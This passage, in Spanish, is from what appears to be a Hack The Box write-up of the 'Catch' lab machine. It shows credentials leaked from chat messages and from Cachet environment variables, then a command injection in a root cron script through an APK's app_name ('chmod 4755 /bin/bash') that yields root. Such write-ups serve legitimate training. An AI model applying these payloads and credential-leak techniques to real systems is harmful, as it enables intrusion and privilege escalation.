+    <span class=code-blue>"id"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>61b86b28d984e2451036eb17<span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"id"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>61b8708efe190b466d476bfb<span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"id"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>61b86b3fd984e2451036eb18<span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}</span>
+<span class=code-dark-magenta>]
+</code></pre></div><p>Con el ID de sala, podemos obtener todos los mensajes y sacar su contenido (clave <code>text</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages -sH <span class=code-dark-yellow>"Authorization: Bearer <span class=code-dark-cyan>$token</span>"</span> | <span class=code-dark-green>gron</span> | <span class=code-dark-green>grep</span> text | <span class=code-dark-green>norg</span>  
+<span class=code-dark-magenta>[</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>ah sure!<span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>You should actually include this task to your list as well as a part of quarterly audit<span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>Also make sure we've our systems, applications and databases up-to-date.<span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>Excellent! <span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>Why not. We've this in our todo list for next quarter<span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>@john is it possible to add SSL to our status domain to make sure everything is secure ? <span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>Here are the credentials `john :  E}V!mywu_69T4C}W`<span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>Sure one sec.<span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>Can you create an account for me ? <span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}<span class=code-white>,</span>
+  <span class=code-dark-magenta>{</span>
+    <span class=code-blue>"text"<span class=code-white>:</span> <span class=code-dark-green>"<span class=code-dark-yellow>Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. <span class=code-dark-green>"</span>
+  <span class=code-dark-magenta>}</span>
+<span class=code-dark-magenta>]
+</code></pre></div><p>Y ahí tenemos la contraseña de <code>john</code>: <code>E}V!mywu_69T4C}W</code>. Si probamos las credenciales en otros servicios, descubriremos que son válidas para Cachet (<code>http://10.10.11.150:8000</code>):</p><p><img src=/images/HTB/Catch/Catch-cachet-access.png alt="Catch Cachet access"></p><p>Si vamos a &ldquo;<em>Settings</em>&rdquo;, veremos que está ejecutámndose Cachet versión 2.4.0-dev:</p><p><img src=/images/HTB/Catch/Catch-cachet-settings.png alt="Catch Cachet settings"></p><p>En este punto, podemos buscar vulnerabilidades que afecten a esta versión. De hecho, hay tres: <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-39172>CVE-2021-39172</a>, <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-39173>CVE-2021-39173</a> y <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-39174>CVE-2021-39174</a>. Estas tres se explican de forma detallada en <a href=https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/>blog.sonarsource.com</a>.</p><p>Podemos explotar la última, que consiste en fugar información de variables de entorno (cargadas en un archivo <code>.env</code>) con la sintaxis <code>${NAME}</code> en la configuración del correo (<em>Server-Side Template Injection</em>). Después de poner <code>${DB_USERNAME}</code> y <code>${DB_PASSWORD}</code> (como se muestra en <a href=https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/>blog.sonarsource.com</a>), obtendremos un usuario (<code>will</code>) y una contraseña (<code>s2#4Fg0_%3!</code>):</p><p><img src=/images/HTB/Catch/Catch-db-username.png alt="Catch Cachet username"></p><p><img src=/images/HTB/Catch/Catch-db-password.png alt="Catch Cachet password"></p><p>Sorprendentemente, estas credenciales son válidas para conectarnos a la máquina mediante SSH, y podemos ver la <em>flag</em> <code>user.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ssh</span> will@10.10.11.150
+will@10.10.11.150's password:
+<span class=code-green>will@catch</span>:<span class=code-blue>~</span>$ cat user.txt
+6b9bf0acbbabd8de17ed0af217914b47  
+</code></pre></div><h2 id=enumeración-del-sistema>Enumeración del sistema</h2><p>Después de hacer la enumeración básica, podemos enumerar procesos con <a href=https://github.com/DominicBreuker/pspy><code>pspy</code></a> y ver un <em>script</em> ejecutado por <code>root</code> de forma periódica:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-blue>CMD: UID=0    PID=30203  | /bin/bash /opt/mdm/verify.sh</span>
+<span class=code-blue>CMD: UID=0    PID=30208  | openssl rand -hex 12</span>
+<span class=code-blue>CMD: UID=0    PID=30209  | mv /opt/mdm/apk_bin/*.apk /root/mdm/apk_bin/7b5167a7e62e3fdbaea84162.apk</span>  
+<span class=code-blue>CMD: UID=0    PID=30210  | jarsigner -verify /root/mdm/apk_bin/7b5167a7e62e3fdbaea84162.apk</span>
+<span class=code-blue>CMD: UID=0    PID=30230  | /bin/bash /opt/mdm/verify.sh</span>
+<span class=code-blue>CMD: UID=0    PID=30233  | grep -v verify.sh</span>
+<span class=code-blue>CMD: UID=0    PID=30232  | grep -v apk_bin</span>
+<span class=code-blue>CMD: UID=0    PID=30231  | ls -A /opt/mdm</span>
+<span class=code-blue>CMD: UID=0    PID=30237  | /usr/sbin/CRON -f</span>
+<span class=code-blue>CMD: UID=0    PID=30236  | /usr/sbin/CRON -f</span>
+<span class=code-blue>CMD: UID=0    PID=30239  | /bin/sh -c rm -rf /root/mdm/certified_apps/*</span>
+<span class=code-blue>CMD: UID=0    PID=30238  | /bin/sh -c rm -rf /root/mdm/certified_apps/*</span>
+<span class=code-blue>CMD: UID=0    PID=30240  |</span>
+<span class=code-blue>CMD: UID=0    PID=30241  | /bin/bash /opt/mdm/verify.sh</span>
+<span class=code-blue>CMD: UID=0    PID=30247  | jarsigner -verify /root/mdm/apk_bin/bf97a421280379d4c67f58ca.apk
+</code></pre></div><p>Vamos a analizar el código fuente de <code>/opt/mdm/verify.sh</code>, que es un <em>script</em> en Bash:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/bin/bash</span>
+
+<span class=mtk3>###################</span>
+<span class=mtk3># Signature Check #</span>
+<span class=mtk3>###################</span>
+
+<span class=mtk8>sig_check</span><span class=mtk1>() {</span>
+<span class=mtk1>        jarsigner -verify </span><span class=mtk4>"</span><span class=mtk1>$1</span><span class=mtk4>/</span><span class=mtk1>$2</span><span class=mtk4>"</span><span class=mtk1> </span><span class=mtk5>2&gt;</span><span class=mtk1>/dev/null </span><span class=mtk5>&gt;</span><span class=mtk1>/dev/null</span>
+<span class=mtk1>        </span><span class=mtk5>if</span><span class=mtk1> [[ $? </span><span class=mtk5>-eq</span><span class=mtk1> 0 ]]</span><span class=mtk5>;</span><span class=mtk1> </span><span class=mtk5>then</span>
+<span class=mtk1>                </span><span class=mtk7>echo</span><span class=mtk1> </span><span class=mtk4>'[+] Signature Check Passed'</span>
+<span class=mtk1>        </span><span class=mtk5>else</span>
+<span class=mtk1>                </span><span class=mtk7>echo</span><span class=mtk1> </span><span class=mtk4>'[!] Signature Check Failed. Invalid Certificate.'</span>
+<span class=mtk1>                cleanup</span>
+<span class=mtk1>                </span><span class=mtk7>exit</span>
+<span class=mtk1>        </span><span class=mtk5>fi</span>
+<span class=mtk1>}</span>
+
+<span class=mtk3>#######################</span>
+<span class=mtk3># Compatibility Check #</span>
+<span class=mtk3>#######################</span>
+
+<span class=mtk8>comp_check</span><span class=mtk1>() {</span>
+<span class=mtk1>        apktool d -s </span><span class=mtk4>"</span><span class=mtk1>$1</span><span class=mtk4>/</span><span class=mtk1>$2</span><span class=mtk4>"</span><span class=mtk1> -o $3 </span><span class=mtk5>2&gt;</span><span class=mtk1>/dev/null </span><span class=mtk5>&gt;</span><span class=mtk1>/dev/null</span>
+<span class=mtk1>        COMPILE_SDK_VER=</span><span class=mtk4>$(grep -oPm1 "(?&lt;=compileSdkVersion=</span><span class=mtk6>\"</span><span class=mtk4>)[^</span><span class=mtk6>\"</span><span class=mtk4>]+" "</span><span class=mtk1>$PROCESS_BIN</span><span class=mtk4>/AndroidManifest.xml")</span>
+<span class=mtk1>        </span><span class=mtk5>if</span><span class=mtk1> [ </span><span class=mtk5>-z</span><span class=mtk1> </span><span class=mtk4>"</span><span class=mtk1>$COMPILE_SDK_VER</span><span class=mtk4>"</span><span class=mtk1> ]</span><span class=mtk5>;</span><span class=mtk1> </span><span class=mtk5>then</span>
+<span class=mtk1>                </span><span class=mtk7>echo</span><span class=mtk1> </span><span class=mtk4>'[!] Failed to find target SDK version.'</span>
+<span class=mtk1>                cleanup</span>
+<span class=mtk1>                </span><span class=mtk7>exit</span>
+<span class=mtk1>        </span><span class=mtk5>else</span>
+<span class=mtk1>                </span><span class=mtk5>if</span><span class=mtk1> [ $COMPILE_SDK_VER </span><span class=mtk5>-lt</span><span class=mtk1> 18 ]</span><span class=mtk5>;</span><span class=mtk1> </span><span class=mtk5>then</span>
+<span class=mtk1>                        </span><span class=mtk7>echo</span><span class=mtk1> </span><span class=mtk4>"[!] APK Doesn't meet the requirements"</span>
+<span class=mtk1>                        cleanup</span>
+<span class=mtk1>                        </span><span class=mtk7>exit</span>
+<span class=mtk1>                </span><span class=mtk5>fi</span>
+<span class=mtk1>        </span><span class=mtk5>fi</span>
+<span class=mtk1>}</span>
+
+<span class=mtk3>####################</span>
+<span class=mtk3># Basic App Checks #</span>
+<span class=mtk3>####################</span>
+
+<span class=mtk8>app_check</span><span class=mtk1>() {</span>
+<span class=mtk1>        APP_NAME=</span><span class=mtk4>$(grep -oPm1 "(?&lt;=&lt;string name=</span><span class=mtk6>\"</span><span class=mtk4>app_name</span><span class=mtk6>\"</span><span class=mtk4>&gt;)[^&lt;]+" "</span><span class=mtk1>$1</span><span class=mtk4>/res/values/strings.xml")</span>
+<span class=mtk1>        </span><span class=mtk7>echo</span><span class=mtk1> $APP_NAME</span>
+<span class=mtk1>        </span><span class=mtk5>if</span><span class=mtk1> [[ $APP_NAME </span><span class=mtk5>==</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk4>"Catch"</span><span class=mtk5>*</span><span class=mtk1> ]]</span><span class=mtk5>;</span><span class=mtk1> </span><span class=mtk5>then</span>
+<span class=mtk1>                </span><span class=mtk7>echo</span><span class=mtk1> -n $APP_NAME</span><span class=mtk5>|</span><span class=mtk1>xargs -I {} sh -c </span><span class=mtk4>'mkdir {}'</span>
+<span class=mtk1>                mv </span><span class=mtk4>"</span><span class=mtk1>$3</span><span class=mtk4>/</span><span class=mtk1>$APK_NAME</span><span class=mtk4>"</span><span class=mtk1> </span><span class=mtk4>"</span><span class=mtk1>$2</span><span class=mtk4>/</span><span class=mtk1>$APP_NAME</span><span class=mtk4>/</span><span class=mtk1>$4</span><span class=mtk4>"</span>
+<span class=mtk1>        </span><span class=mtk5>else</span>
+<span class=mtk1>                </span><span class=mtk7>echo</span><span class=mtk1> </span><span class=mtk4>"[!] App doesn't belong to Catch Global"</span>
+<span class=mtk1>                cleanup</span>
+<span class=mtk1>                </span><span class=mtk7>exit</span>
+<span class=mtk1>        </span><span class=mtk5>fi</span>
+<span class=mtk1>}</span>
+
+
+<span class=mtk3>###########</span>
+<span class=mtk3># Cleanup #</span>
+<span class=mtk3>###########</span>
+
+<span class=mtk8>cleanup</span><span class=mtk1>() {</span>
+<span class=mtk1>        rm -rf $PROCESS_BIN</span><span class=mtk5>;</span><span class=mtk1>rm -rf </span><span class=mtk4>"</span><span class=mtk1>$DROPBOX</span><span class=mtk4>/*"</span><span class=mtk1> </span><span class=mtk4>"</span><span class=mtk1>$IN_FOLDER</span><span class=mtk4>/*"</span><span class=mtk5>;</span><span class=mtk1>rm -rf </span><span class=mtk4>$(ls -A /opt/mdm </span><span class=mtk5>|</span><span class=mtk4> grep -v apk_bin </span><span class=mtk5>|</span><span class=mtk4> grep -v verify.sh)</span>  
+<span class=mtk1>}</span>
+
+
+<span class=mtk3>###################</span>
+<span class=mtk3># MDM CheckerV1.0 #</span>
+<span class=mtk3>###################</span>
+
+<span class=mtk1>DROPBOX=/opt/mdm/apk_bin</span>
+<span class=mtk1>IN_FOLDER=/root/mdm/apk_bin</span>
+<span class=mtk1>OUT_FOLDER=/root/mdm/certified_apps</span>
+<span class=mtk1>PROCESS_BIN=/root/mdm/process_bin</span>
+
+<span class=mtk5>for</span><span class=mtk1> IN_APK_NAME </span><span class=mtk5>in</span><span class=mtk1> $DROPBOX/</span><span class=mtk5>*</span><span class=mtk1>.apk</span><span class=mtk5>;do</span>
+<span class=mtk1>        OUT_APK_NAME=</span><span class=mtk4>"$(echo </span><span class=mtk1>${IN_APK_NAME</span><span class=mtk5>##*/</span><span class=mtk1>}</span><span class=mtk4> </span><span class=mtk5>|</span><span class=mtk4> cut -d '.' -f1)_verified.apk"</span>
+<span class=mtk1>        APK_NAME=</span><span class=mtk4>"$(openssl rand -hex 12).apk"</span>
+<span class=mtk1>        </span><span class=mtk5>if</span><span class=mtk1> [[ </span><span class=mtk5>-L</span><span class=mtk1> </span><span class=mtk4>"</span><span class=mtk1>$IN_APK_NAME</span><span class=mtk4>"</span><span class=mtk1> ]]</span><span class=mtk5>;</span><span class=mtk1> </span><span class=mtk5>then</span>
+<span class=mtk1>                </span><span class=mtk7>exit</span>
+<span class=mtk1>        </span><span class=mtk5>else</span>
+<span class=mtk1>                mv </span><span class=mtk4>"</span><span class=mtk1>$IN_APK_NAME</span><span class=mtk4>"</span><span class=mtk1> </span><span class=mtk4>"</span><span class=mtk1>$IN_FOLDER</span><span class=mtk4>/</span><span class=mtk1>$APK_NAME</span><span class=mtk4>"</span>
+<span class=mtk1>        </span><span class=mtk5>fi</span>
+<span class=mtk1>        sig_check $IN_FOLDER $APK_NAME</span>
+<span class=mtk1>        comp_check $IN_FOLDER $APK_NAME $PROCESS_B</span><span class=mtk1>IN</span>
+<span class=mtk1>        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOL</span><span class=mtk1>DER $OUT_APK_NAME</span>
+<span class=mtk5>done</span>
+<span class=mtk1>cleanup</span>
+</code></pre></div><p>Básicamente, coge todos los archivos APK en <code>/opt/mdm/apk_bin</code> y aplica las funciones <code>sig_check</code>, <code>comp_check</code> y <code>app_check</code> sobre ellos:</p><ul><li><code>sig_check</code> hace uso de <code>jarsigner</code> para verificar que el archivo APK tiene una firma válida; y si no, termina</li><li><code>comp_check</code> lee el archivo <code>AndroidManifest.xml</code> después de extraer los archivos con <code>apktool</code> para verificar que la versión de Android SDK es al menos 18</li><li><code>app_check</code> lee el archivo <code>res/values/strings.xml</code> y verifica que la cadena <code>"Catch"</code> aparece en la cadena <code>app_name</code>. Si esto ocurre, se ejecutan las siguientes líneas de código:</li></ul><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>        APP_NAME=</span><span class=mtk4>$(grep -oPm1 "(?&lt;=&lt;string name=</span><span class=mtk6>\"</span><span class=mtk4>app_name</span><span class=mtk6>\"</span><span class=mtk4>&gt;)[^&lt;]+" "</span><span class=mtk1>$1</span><span class=mtk4>/res/values/strings.xml")</span>  
+<span class=mtk1>        </span><span class=mtk7>echo</span><span class=mtk1> $APP_NAME</span>
+<span class=mtk1>        </span><span class=mtk5>if</span><span class=mtk1> [[ $APP_NAME </span><span class=mtk5>==</span><span class=mtk1> </span><span class=mtk5>*</span><span class=mtk4>"Catch"</span><span class=mtk5>*</span><span class=mtk1> ]]</span><span class=mtk5>;</span><span class=mtk1> </span><span class=mtk5>then</span>
+<span class=mtk1>                </span><span class=mtk7>echo</span><span class=mtk1> -n $APP_NAME</span><span class=mtk5>|</span><span class=mtk1>xargs -I {} sh -c </span><span class=mtk4>'mkdir {}'</span>
+<span class=mtk1>                mv </span><span class=mtk4>"</span><span class=mtk1>$3</span><span class=mtk4>/</span><span class=mtk1>$APK_NAME</span><span class=mtk4>"</span><span class=mtk1> </span><span class=mtk4>"</span><span class=mtk1>$2</span><span class=mtk4>/</span><span class=mtk1>$APP_NAME</span><span class=mtk4>/</span><span class=mtk1>$4</span><span class=mtk4>"</span>
+<span class=mtk3>        # ...</span>
+<span class=mtk1>        </span><span class=mtk5>fi</span>
+</code></pre></div><p>Lo único que podemos controlar en este <em>script</em> en Bash es <code>$APP_NAME</code>. De hecho, el código es vulnerable a inyección de comandos porque no hay comillas dobles en <code>$APP_NAME</code>. Esto puede derivar en inyección de comandos, aquí hay una simple prueba de concepto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> APP_NAME=<span class=code-dark-yellow>'Catch | whoami'</span>
+
+<span class=code-cyan>$</span> <span class=code-dark-green>echo</span> $APP_NAME | <span class=code-dark-green>xargs</span> -I {} sh -c <span class=code-dark-yellow>'echo {}'</span>  
+rocky
+</code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios</h2><p>Por tanto, podemos coger el archivo APK que descargamos al principio, extraer su contenido con <code>apktool</code> modificar la configuración de <code>app_name</code> y construir el archivo APK de nuevo con <code>apktool</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>apktool</span> d <span class=mtku>catchv1.0.apk</span>
+I: Using Apktool 2.6.1 on catchv1.0.apk
+I: Loading resource table...
+I: Decoding AndroidManifest.xml with resources...
+I: Loading resource table from file...
+I: Regular manifest package...
+I: Decoding file-resources...
+I: Decoding values */* XMLs...
+I: Baksmaling classes.dex...
+I: Copying assets and libs...
+I: Copying unknown files...
+I: Copying original files...
+
+<span class=code-cyan>$</span> <span class=code-dark-green>vim</span> app_name <span class=mtku>catchv1.0/res/values/strings.xml</span>
+
+<span class=code-cyan>$</span> <span class=code-dark-green>grep</span> app_name <span class=mtku>catchv1.0/res/values/strings.xml</span>
+                &lt;string name="<span class=code-red>app_name</span>"&gt;Catch | chmod 4755 /bin/bash; echo &lt;/string&gt;  
+
+<span class=code-cyan>$</span> <span class=code-dark-green>apktool</span> b <span class=mtku>catchv1.0</span>
+I: Using Apktool 2.6.1
+I: Checking whether sources has changed...
+I: Smaling smali folder into classes.dex...
+I: Checking whether resources has changed...
+I: Building resources...
+I: Building apk file...
+I: Copying unknown files/dir...
+I: Built apk...
+</code></pre></div><p>Con el <em>payload</em> de arriba trataremos de hacer que <code>/bin/bash</code> sea un binario SUID. Entonces, una vez que pongamos el archivo APK en <code>/opt/mdm/apk_bin</code> y <code>root</code> ejecute el <em>script</em> en Bash, entonces <code>/bin/bash</code> será SUID:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>will@catch</span>:<span class=code-blue>/tmp</span>$ cd /opt/mdm/apk_bin
+<span class=code-green>will@catch</span>:<span class=code-blue>/opt/mdm/apk_bin</span>$ ls -l --time-style=+ /bin/bash
+-rwxr-xr-x 1 root root 1183448  <span class=code-green>/bin/bash</span>
+<span class=code-green>will@catch</span>:<span class=code-blue>/opt/mdm/apk_bin</span>$ wget -q 10.10.17.44/catchv1.0.apk  
+<span class=code-green>will@catch</span>:<span class=code-blue>/opt/mdm/apk_bin</span>$ ls -l --time-style=+
+total 2724
+drwxrwx--x+ 2 root root    4096  <span class=code-blue>.</span>/
+drwxr-x--x+ 3 root root    4096  <span class=code-blue>..</span>/
+-rw-rw-r--  1 will will 2778468  catchv1.0.apk
+<span class=code-green>will@catch</span>:<span class=code-blue>/opt/mdm/apk_bin</span>$ ls -l --time-style=+ /bin/bash
+-rwsr-xr-x 1 root root 1183448  <span class="code-white code-bg-red">/bin/bash</span>
+</code></pre></div><p>Genial, ya podemos ejecutar Bash como <code>root</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>will@catch</span>:<span class=code-blue>/opt/mdm/apk_bin</span>$ bash -p
+bash-5.0# cat /root/root.txt
+a4be51d5332126cbbb61423f2233f0a4
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#analizando-un-archivo-apk>Analizando un archivo APK</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>
